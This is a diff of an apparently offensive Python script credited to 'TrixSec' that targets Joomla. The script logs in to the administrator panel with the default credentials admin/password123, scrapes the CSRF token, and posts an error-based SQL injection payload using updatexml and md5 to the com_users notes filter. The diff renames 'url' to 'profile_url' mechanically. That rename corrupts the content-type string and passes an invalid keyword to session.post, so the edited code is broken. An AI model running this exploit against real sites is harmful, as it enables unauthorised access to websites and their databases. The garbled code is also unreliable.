@@ -14,12 +14,12 @@ init()
 
 author = 'TrixSec'
 
-def get_pass(url):
+def get_pass(profile_url):
     user = 'admin'
     passwd = 'password123'
-    login_url = urljoin(url, '/administrator/index.php')
+    login_profile_url = urljoin(profile_url, '/administrator/index.php')
     session = requests.Session()
-    content = session.get(login_url).content
+    content = session.get(login_profile_url).content
 
     re_para = r'<input type="hidden" name="return" value="(.*?)"/>.*<input type="hidden" name="(.*?)" value="1" />'
     match = re.findall(re_para, content, re.S)
@@ -27,24 +27,24 @@ def get_pass(url):
     if match:
         value, token = match[0][0], match[0][1]
         headers = {
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-profile_urlencoded"
         }
         pass_payload = f'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'
-        session.post(url=login_url, headers=headers, data=pass_payload, verify=False)
+        session.post(profile_url=login_profile_url, headers=headers, data=pass_payload, verify=False)
         print(f"{Fore.GREEN}{Style.BRIGHT}Admin Login Successful!{Style.RESET_ALL}")
         return session, headers
     else:
         print(f"{Fore.RED}{Style.BRIGHT}Failed to retrieve CSRF token or login details.{Style.RESET_ALL}")
         return None, None
 
-def execute_sqli(url, session, headers):
+def execute_sqli(profile_url, session, headers):
     rand_str = ''.join([str(i) for i in range(10)]) 
-    sqli_url = urljoin(url, '/administrator/index.php?option=com_users&view=notes')
+    sqli_profile_url = urljoin(profile_url, '/administrator/index.php?option=com_users&view=notes')
     sqli_payload = f'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({rand_str}))),0))'
 
-    r = session.post(url=sqli_url, headers=headers, data=sqli_payload, verify=False)
+    r = session.post(profile_url=sqli_profile_url, headers=headers, data=sqli_payload, verify=False)
     if r.status_code == 500 and hashlib.md5(rand_str).hexdigest()[:31] in r.content:
-        print(f"{Fore.GREEN}{Style.BRIGHT}SQL Injection Successful! Exploit URL: {sqli_url}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}{Style.BRIGHT}SQL Injection Successful! Exploit profile_url: {sqli_profile_url}{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}SQL Injection Failed!{Style.RESET_ALL}")
 
